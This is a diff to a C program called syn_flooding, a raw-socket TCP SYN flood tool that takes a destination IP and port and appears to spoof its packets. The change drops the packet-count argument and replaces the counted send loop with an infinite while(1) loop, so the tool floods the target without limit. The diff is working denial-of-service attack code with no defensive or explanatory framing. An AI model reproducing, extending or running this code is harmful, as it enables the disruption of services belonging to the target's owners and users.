@@ -113,15 +113,15 @@ int main(int argc, char *argv[])
 	  printf("Run with root privileges.\n");
 		exit(-1);
 	}
-	if(argc<4)
+	if(argc<3)
 	{
-		printf("Usage: ./syn_flooding dst_ip dst_port pckt_count\n");
+		printf("Usage: ./syn_flooding dst_ip dst_port\n");
 		exit(-1);
 	}
 	//Use provided args for spoofing
 	char *dst_ip=argv[1];
 	unsigned short dst_port=stoi(argv[2]);
-	unsigned int pckt_count=stoi(argv[3]);
+	// unsigned int pckt_count=stoi(argv[3]);
 	//Create a raw socket
 	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
 
@@ -146,8 +146,8 @@ int main(int argc, char *argv[])
 		printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
 		exit(0);
 	}
-  printf("Sending %d packets...\n", pckt_count);
-	while(pckt_count--)
+  // printf("Sending %d packets...\n", pckt_count);
+	while(1)//pckt_count--)
 	{
 		//Send the packet
 		if (sendto (s,			/* our socket */
